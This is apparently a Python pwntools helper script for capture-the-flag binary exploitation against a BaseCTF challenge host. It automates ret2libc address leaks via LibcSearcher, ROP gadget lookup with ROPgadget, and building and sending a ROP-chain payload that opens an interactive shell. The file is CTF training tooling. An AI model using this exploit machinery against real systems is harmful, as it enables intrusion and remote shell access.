from pwn import *
from LibcSearcher import *
import os

dir = 'challenge.basectf.fun:27271'
file = './pwn'
libc_target = ''
host,port = dir.split(':')

elf_state = True
libc_state = True
ps_state = True
shell = 'chmod +x '+ libc_target

try:
    p = remote(host,port)
    p.close()
except:
    ps_state = False

if libc_target == '':
    libc_state = False
else:
    try:
        libc = ELF(libc_target)
    except:
        os.system(shell)
        try:
            libc = ELF(libc_target)
        except:
            libc_state = False

try:
    elf = ELF(file)
except:
    elf_state = False

def answer(name, data = None, item = None):
    type_data = isinstance(data,str)
    if name == 'offest' or name == 'padding':
        if item is None:
            success(name + ': ' + hex(data) + '=' + str(data))
        else:
            success(name + ': ' + hex(data) + '=' + str(data) + '\t(' + item + ')')
    elif name == 'success' or name == 'error' or name == 'done':
        success(name)
    else:
        if type_data == True:
            success(name + ' -> ' + data)
        else:
            if data == True or data == False:
                if name == 'ps_state':
                    if data == False:
                        data = 'local'
                    else:
                        data = 'internet'
                success(name + ' ->\t' + str(data))
            else:
                success(name + ' -> {:#x}'.format(data))

def gdb_pause():
    gdb.attach(p)

def p6(text):
    return p64(text)

def p3(text):
    return p32(text)

def data_recv_text():
    p.recv()
    p.recv()

def data_recv(name,type):
    if type == 64:
        data = u64(p.recvuntil("\x7f")[-6:].ljust(8,b'\x00'))
    if type == 32:
        data = u32(p.recv(4))
    answer(name,data)
    return data

def libc_compute(name,name_add,mode = None):
    #only ret2libc
    global system_add
    global binsh_add
    log.success('https://libc.rip/')
    if libc_state == False or mode != 'local':
        libc = LibcSearcher(name,name_add)
        libc_base = name_add - libc.dump(name)
        binsh_add = libc_base + libc.dump('str_bin_sh')
        system_add = libc_base + libc.dump('system')
    else:
        libc = ELF(libc_target)
        libc_base = name_add - libc.sym[name]
        system_add = libc_base + libc.sym['system']
        binsh_add = libc_base + get_binsh_offest()
    answer('libc_base',libc_base)
    answer('system_add',system_add)
    answer('binsh_add',binsh_add)

def get_binsh_offest():
    with open('libc.so.6','rb') as file:
        data = file.read()
    offest = data.find(b'\x2f\x62\x69\x6e\x2f\x73\x68\x00')
    answer('offest',offest)
    file.close()
    return offest

# ps_state = False

answer('elf_state',elf_state)
answer('libc_state',libc_state)
answer('ps_state',ps_state)

if ps_state == True:
    p = remote(host,port)
else:
    p = process(file)

answer('done')

def get_rop(name):
    if name == 'ret':
        shell = 'ROPgadget --binary ' + file[2:] + ' --only "pop|ret"|grep ": ' + name + '"'
    else:
        shell = 'ROPgadget --binary ' + file[2:] + ' --only "pop|ret"|grep ' + name
    try:
        result = int(os.popen(shell).readlines()[0][2:19],16)
        answer(name,result)
        return result
    except:
        answer('error')

shell = 'ROPgadget --binary ' + './gift' + ' --ropchain'

def rop_attack_basic():
    data = os.popen(shell).readlines()
    for i in range(len(data)):
        if data[i] == 'from struct import pack\n':
            data = data[i+1:]
            return data

def rop_attack(padding):
    data = rop_attack_basic()
    print('from pwn import *')
    print('io = remote("'+host+'",'+port+');')
    for i in range(len(data)):
        print(data[i],end='')
    print('padding = ' + str(padding))
    print("payload = b'a'*padding+p")
    print('io.recv()')
    print("io.sendline(payload)")
    print("io.interactive()")

def rop_auto_attack(padding):
    data = rop_attack_basic()
    shell = ''
    for i in range(len(data)):
        try:
            data.remove('\n')
        except:
            break
    for i in range(len(data)):
        if data[i][0] == '\v':
            data[i] += data[i][1:]
        if data[i].find('#') != -1:
            data[i] = data[i][:data[i].find('#')]
        if data[i].find('\n') != 1:
            data[i] = data[i][:data[i].find('\n')]
        if data[i] != '':
            shell += data[i] + ';'
    padding = padding
    payload = 'payload = ' + str(b'a'*padding) + '+p;'
    print(payload)
    shell += payload + 'io.recv();io.sendline(payload);io.interactive()'
    shell = 'python -c "from pwn import *;io=remote(\'' + host + '\',' + str(port) + ');from struct import pack;'+shell+'"'
    print(shell)
    os.system(shell)

def number_hex(number):
    number_copy = number
    if type(number) == float:
        number = int(float(number))
    if number_copy < 0:
        number = int(bin(number & 0xffffffff),2)
    return hex(number)

rop_state = True

if elf_state == True and rop_state == True:
    shell = 'ROPgadget --binary ' + file[2:] + ' --only "pop|ret"'
    os.system(shell)

context(os='linux', arch='amd64',log_level = 'debug')


